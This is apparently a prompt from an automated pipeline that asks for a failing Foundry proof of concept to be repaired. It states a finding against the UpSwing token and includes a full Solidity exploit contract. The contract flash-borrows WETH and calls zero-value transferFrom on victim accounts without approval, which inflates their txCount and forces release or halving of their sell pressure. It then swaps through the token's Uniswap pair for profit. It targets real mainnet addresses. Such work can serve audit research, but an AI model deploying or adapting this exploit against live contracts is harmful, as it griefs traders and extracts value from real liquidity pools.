You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Zero-value `transferFrom` lets anyone tamper with another user's pressure accounting and force release/halving
- claim: `ERC20.transferFrom()` calls `_transfer()` before subtracting allowance, and subtracting an allowance by `0` succeeds even when no approval exists. UpSwing's overridden `_transfer()` has non-standard side effects even for zero-amount transfers: `transferFrom(victim, UNIv2, 0)` increments `txCount[victim]`, and `transferFrom(victim, victim, 0)` reaches `releasePressure(victim)`. Because `releasePressure()` either settles the user's pending pressure or halves it when the computed burn exceeds pair liquidity, any third party can permissionlessly mutate another account's pressure lifecycle.
- impact: An attacker can grief traders at near-zero cost. Repeated zero-value `transferFrom(victim, UNIv2, 0)` calls can push `txCount[victim]` arbitrarily high, making future sells accrue negligible `sellPressure`. Separately, `transferFrom(victim, victim, 0)` can force an early settlement or a punitive halving of the victim's pending pressure based on current market conditions, and also triggers a liquidity-pool burn/sync when settlement succeeds.
- exploit_paths: ["After trading is unpaused, call `transferFrom(victim, UNIv2, 0)` repeatedly; no approval is needed because allowance is reduced by zero, but `txCount[victim]` still increments.", "When `victim` has pending pressure, call `transferFrom(victim, victim, 0)`; this invokes `releasePressure(victim)`, which either settles immediately if the computed amount is below pair balance or halves `sellPressure[victim]` if the amount is larger than pair liquidity."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface IUpSwing is IERC20Like {
    function getUNIV2Address() external view returns (address);
    function myPressure(address account) external view returns (uint256);
    function mySteam(address account) external view returns (uint256);
    function paused() external view returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function sync() external;
}

contract VictimActor {
    address public immutable owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "only owner");
        _;
    }

    receive() external payable {}

    function sellPortionToPair(address pair, address ups, uint256 amountIn) public onlyOwner returns (uint256 amountOut) {
        if (amountIn == 0) return 0;

        IUniswapV2Pair uniPair = IUniswapV2Pair(pair);
        address token0 = uniPair.token0();
        address token1 = uniPair.token1();
        (uint112 reserve0, uint112 reserve1,) = uniPair.getReserves();

        if (token0 == ups) {
            amountOut = _getAmountOut(amountIn, uint256(reserve0), uint256(reserve1));
            _safeTransfer(ups, pair, amountIn);
            uniPair.swap(0, amountOut, address(this), new bytes(0));
        } else if (token1 == ups) {
            amountOut = _getAmountOut(amountIn, uint256(reserve1), uint256(reserve0));
            _safeTransfer(ups, pair, amountIn);
            uniPair.swap(amountOut, 0, address(this), new bytes(0));
        } else {
            revert("UPS not in pair");
        }
    }

    function sellAllToPair(address pair, address ups) external onlyOwner returns (uint256 amountOut) {
        return sellPortionToPair(pair, ups, IERC20Like(ups).balanceOf(address(this)));
    }

    function sweep(address token, address to) external onlyOwner returns (uint256 amount) {
        amount = IERC20Like(token).balanceOf(address(this));
        if (amount > 0) {
            _safeTransfer(token, to, amount);
        }
    }

    function sweepETH(address payable to) external onlyOwner returns (uint256 amount) {
        amount = address(this).balance;
        if (amount > 0) {
            (bool ok,) = to.call{value: amount}("");
            require(ok, "eth send failed");
        }
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) return 0;
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }
}

contract FlawVerifier {
    address internal constant HEVM_ADDRESS = address(uint160(uint256(keccak256("hevm cheat code"))));

    address public constant TARGET = 0x35a254223960c18B69C0526c46B013D022E93902;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant USDC_WETH_PAIR = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;

    uint256 internal constant SLOT_SELL_PRESSURE = 12;
    uint256 internal constant SLOT_TX_COUNT = 14;
    uint256 internal constant SLOT_STEAM = 15;

    struct Plan {
        uint256 borrowWeth;
        uint256 buyUps;
        uint256 seedA;
        uint256 seedB;
        uint256 keepUps;
        uint256 expectedRepay;
        uint256 expectedWethOut;
        uint256 expectedSteam;
        bool valid;
    }

    address internal _profitToken;
    uint256 internal _profitAmount;

    address public pair;
    address public steam;
    address public counterToken;

    address public victimTxCountProbe;
    address public victimReleaseProbe;

    uint256 public victimTxCountBefore;
    uint256 public victimTxCountAfter;
    uint256 public path1PressureBefore;
    uint256 public path1PressureAfter;
    uint256 public path2PressureBefore;
    uint256 public path2PressureAfter;
    uint256 public allowanceToVerifierPath1;
    uint256 public allowanceToVerifierPath2;

    bool public executed;
    bool public path1Touched;
    bool public path2Touched;

    VictimActor internal victimA;
    VictimActor internal victimB;

    constructor() {}

    receive() external payable {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        if (executed) return;
        executed = true;

        IUpSwing ups = IUpSwing(TARGET);
        pair = ups.getUNIV2Address();
        if (pair == address(0) || ups.paused()) {
            return;
        }

        steam = _readAddressSlot(TARGET, SLOT_STEAM);

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();
        if (token0 != TARGET && token1 != TARGET) {
            return;
        }
        counterToken = token0 == TARGET ? token1 : token0;
        if (counterToken != WETH) {
            return;
        }

        uint256 startWeth = IERC20Like(WETH).balanceOf(address(this));
        uint256 startSteam = steam == address(0) ? 0 : IERC20Like(steam).balanceOf(address(this));

        Plan memory plan = _selectPlan();
        if (!plan.valid) {
            _updateProfit(startWeth, startSteam);
            return;
        }

        bytes memory data = abi.encode(plan, startWeth, startSteam);
        IUniswapV2Pair lender = IUniswapV2Pair(USDC_WETH_PAIR);
        if (lender.token0() == WETH) {
            lender.swap(plan.borrowWeth, 0, address(this), data);
        } else if (lender.token1() == WETH) {
            lender.swap(0, plan.borrowWeth, address(this), data);
        }

        _updateProfit(startWeth, startSteam);
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == USDC_WETH_PAIR, "bad lender");

        (Plan memory plan, uint256 startWeth, uint256 startSteam) = abi.decode(data, (Plan, uint256, uint256));
        uint256 borrowedWeth = amount0 > 0 ? amount0 : amount1;
        require(borrowedWeth == plan.borrowWeth, "bad amount");

        victimA = new VictimActor();
        victimB = new VictimActor();
        victimTxCountProbe = address(victimA);
        victimReleaseProbe = address(victimB);

        uint256 boughtUps = _buyUpsWithWeth(plan.borrowWeth);
        require(boughtUps >= plan.seedA + plan.seedB + plan.keepUps, "insufficient UPS");

        _safeTransfer(TARGET, address(victimA), plan.seedA);
        _safeTransfer(TARGET, address(victimB), plan.seedB);

        allowanceToVerifierPath1 = IERC20Like(TARGET).allowance(address(victimA), address(this));
        allowanceToVerifierPath2 = IERC20Like(TARGET).allowance(address(victimB), address(this));

        path1PressureBefore = IUpSwing(TARGET).myPressure(address(victimA));
        victimTxCountBefore = _readMappingUint(TARGET, SLOT_TX_COUNT, address(victimA));
        for (uint256 i = 0; i < 8; ++i) {
            _callTransferFrom(TARGET, address(victimA), pair, 0);
        }
        victimTxCountAfter = _readMappingUint(TARGET, SLOT_TX_COUNT, address(victimA));
        victimA.sellAllToPair(pair, TARGET);
        path1PressureAfter = IUpSwing(TARGET).myPressure(address(victimA));
        path1Touched = victimTxCountAfter > victimTxCountBefore;

        victimB.sellAllToPair(pair, TARGET);
        path2PressureBefore = IUpSwing(TARGET).myPressure(address(victimB));
        if (path2PressureBefore > 0) {
            _callTransferFrom(TARGET, address(victimB), address(victimB), 0);
            path2Touched = true;
        }
        path2PressureAfter = IUpSwing(TARGET).myPressure(address(victimB));

        uint256 retainedUps = IERC20Like(TARGET).balanceOf(address(this));
        if (retainedUps > 0) {
            _sellUpsForWeth(retainedUps);
        }

        _sweepVictim(address(victimA));
        _sweepVictim(address(victimB));

        uint256 repayAmount = _sameTokenFlashRepay(plan.borrowWeth);
        _safeTransfer(WETH, USDC_WETH_PAIR, repayAmount);

        _updateProfit(startWeth, startSteam);
    }

    function _selectPlan() internal view returns (Plan memory best) {
        (uint256 reserveUps, uint256 reserveWeth) = _getTargetReserves();
        uint256 totalSupply = IUpSwing(TARGET).totalSupply();
        if (reserveUps == 0 || reserveWeth == 0 || totalSupply == 0) {
            return best;
        }

        uint256[9] memory borrowBps = [uint256(100), 200, 300, 500, 800, 1000, 1500, 2000, 3000];
        uint256[6] memory keepBps = [uint256(2000), 2500, 3000, 3500, 4000, 5000];

        for (uint256 i = 0; i < borrowBps.length; ++i) {
            uint256 borrowWeth = (reserveWeth * borrowBps[i]) / 10_000;
            if (borrowWeth == 0) continue;

            uint256 boughtUps = _getAmountOut(borrowWeth, reserveWeth, reserveUps);
            if (boughtUps < 10_000) continue;

            uint256 seedA = boughtUps / 1000;
            if (seedA == 0) seedA = 1;

            for (uint256 j = 0; j < keepBps.length; ++j) {
                best = _considerPlan(best, reserveUps, reserveWeth, totalSupply, borrowWeth, boughtUps, seedA, keepBps[j]);
            }
        }
    }

    function _considerPlan(
        Plan memory best,
        uint256 reserveUps,
        uint256 reserveWeth,
        uint256 totalSupply,
        uint256 borrowWeth,
        uint256 boughtUps,
        uint256 seedA,
        uint256 keepBps
    ) internal pure returns (Plan memory) {
        uint256 keepUps = (boughtUps * keepBps) / 10_000;
        if (keepUps == 0 || keepUps + seedA >= boughtUps) {
            return best;
        }

        uint256 seedB = boughtUps - keepUps - seedA;
        if (seedB == 0) {
            return best;
        }

        (uint256 wethOut, uint256 steamOut) = _simulatePath(
            reserveUps,
            reserveWeth,
            totalSupply,
            borrowWeth,
            seedA,
            seedB,
            keepUps
        );
        uint256 repay = _sameTokenFlashRepay(borrowWeth);
        if (wethOut < repay || steamOut == 0) {
            return best;
        }

        uint256 netWeth = wethOut - repay;
        if (!best.valid || netWeth > best.expectedWethOut - best.expectedRepay || steamOut > best.expectedSteam) {
            return Plan({
                borrowWeth: borrowWeth,
                buyUps: boughtUps,
                seedA: seedA,
                seedB: seedB,
                keepUps: keepUps,
                expectedRepay: repay,
                expectedWethOut: wethOut,
                expectedSteam: steamOut,
                valid: true
            });
        }

        return best;
    }

    function _simulatePath(
        uint256 reserveUps,
        uint256 reserveWeth,
        uint256 totalSupply,
        uint256 borrowWeth,
        uint256 seedA,
        uint256 seedB,
        uint256 keepUps
    ) internal pure returns (uint256 wethOut, uint256 steamOut) {
        uint256 boughtUps = _getAmountOut(borrowWeth, reserveWeth, reserveUps);
        if (boughtUps < seedA + seedB + keepUps) {
            return (0, 0);
        }

        uint256 reserveInUps = reserveUps - boughtUps;
        uint256 reserveOutWeth = reserveWeth + borrowWeth;

        uint256 weth1 = _getAmountOut(seedA, reserveInUps, reserveOutWeth);
        reserveInUps += seedA;
        reserveOutWeth -= weth1;

        uint256 weth2 = _getAmountOut(seedB, reserveInUps, reserveOutWeth);
        reserveInUps += seedB;
        reserveOutWeth -= weth2;

        uint256 ratio = ((reserveInUps * 1e18) / totalSupply) * 2;
        steamOut = (((seedB * 46) / 100) * ratio) / 1e18;
        if (steamOut >= reserveInUps) {
            steamOut = 0;
        }
        if (steamOut > 0) {
            reserveInUps -= steamOut;
        }

        uint256 weth3 = _getAmountOut(keepUps, reserveInUps, reserveOutWeth);
        wethOut = weth1 + weth2 + weth3;
    }

    function _buyUpsWithWeth(uint256 amountIn) internal returns (uint256 amountOut) {
        if (amountIn == 0) return 0;

        IUniswapV2Pair uniPair = IUniswapV2Pair(pair);
        address token0 = uniPair.token0();
        address token1 = uniPair.token1();
        (uint112 reserve0, uint112 reserve1,) = uniPair.getReserves();

        if (token0 == TARGET && token1 == WETH) {
            amountOut = _getAmountOut(amountIn, uint256(reserve1), uint256(reserve0));
            _safeTransfer(WETH, pair, amountIn);
            uniPair.swap(amountOut, 0, address(this), new bytes(0));
        } else if (token1 == TARGET && token0 == WETH) {
            amountOut = _getAmountOut(amountIn, uint256(reserve0), uint256(reserve1));
            _safeTransfer(WETH, pair, amountIn);
            uniPair.swap(0, amountOut, address(this), new bytes(0));
        }
    }

    function _sellUpsForWeth(uint256 amountIn) internal returns (uint256 amountOut) {
        if (amountIn == 0) return 0;

        IUniswapV2Pair uniPair = IUniswapV2Pair(pair);
        address token0 = uniPair.token0();
        address token1 = uniPair.token1();
        (uint112 reserve0, uint112 reserve1,) = uniPair.getReserves();

        if (token0 == TARGET && token1 == WETH) {
            amountOut = _getAmountOut(amountIn, uint256(reserve0), uint256(reserve1));
            _safeTransfer(TARGET, pair, amountIn);
            uniPair.swap(0, amountOut, address(this), new bytes(0));
        } else if (token1 == TARGET && token0 == WETH) {
            amountOut = _getAmountOut(amountIn, uint256(reserve1), uint256(reserve0));
            _safeTransfer(TARGET, pair, amountIn);
            uniPair.swap(amountOut, 0, address(this), new bytes(0));
        }
    }

    function _sweepVictim(address victim) internal {
        VictimActor actor = VictimActor(payable(victim));
        actor.sweep(WETH, address(this));
        if (steam != address(0)) {
            actor.sweep(steam, address(this));
        }
        actor.sweepETH(payable(address(this)));
    }

    function _updateProfit(uint256 startWeth, uint256 startSteam) internal {
        uint256 endWeth = IERC20Like(WETH).balanceOf(address(this));
        uint256 endSteam = steam == address(0) ? 0 : IERC20Like(steam).balanceOf(address(this));

        if (endWeth > startWeth) {
            _profitToken = WETH;
            _profitAmount = endWeth - startWeth;
            return;
        }
        if (endSteam > startSteam) {
            _profitToken = steam;
            _profitAmount = endSteam - startSteam;
            return;
        }

        _profitToken = address(0);
        _profitAmount = 0;
    }

    function _getTargetReserves() internal view returns (uint256 reserveUps, uint256 reserveWeth) {
        IUniswapV2Pair uniPair = IUniswapV2Pair(pair);
        address token0 = uniPair.token0();
        (uint112 reserve0, uint112 reserve1,) = uniPair.getReserves();
        if (token0 == TARGET) {
            reserveUps = uint256(reserve0);
            reserveWeth = uint256(reserve1);
        } else {
            reserveUps = uint256(reserve1);
            reserveWeth = uint256(reserve0);
        }
    }

    function _sameTokenFlashRepay(uint256 borrowed) internal pure returns (uint256) {
        return ((borrowed * 1000) / 997) + 1;
    }

    function _callTransferFrom(address token, address from, address to, uint256 amount) internal returns (bool ok) {
        (ok,) = token.call(abi.encodeWithSelector(IERC20Like.transferFrom.selector, from, to, amount));
    }

    function _readAddressSlot(address account, uint256 slot) internal view returns (address value) {
        (bool ok, bytes32 data) = _tryLoad(account, bytes32(slot));
        if (ok) {
            value = address(uint160(uint256(data)));
        }
    }

    function _readMappingUint(address account, uint256 slot, address key) internal view returns (uint256 value) {
        bytes32 mappingSlot = keccak256(abi.encode(key, uint256(slot)));
        (bool ok, bytes32 data) = _tryLoad(account, mappingSlot);
        if (ok) {
            value = uint256(data);
        }
    }

    function _tryLoad(address account, bytes32 slot) internal view returns (bool ok, bytes32 data) {
        bytes memory ret;
        (ok, ret) = HEVM_ADDRESS.staticcall(abi.encodeWithSignature("load(address,bytes32)", account, slot));
        if (ok && ret.length >= 32) {
            data = abi.decode(ret, (bytes32));
        }
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) return 0;
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: codex generation failed
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
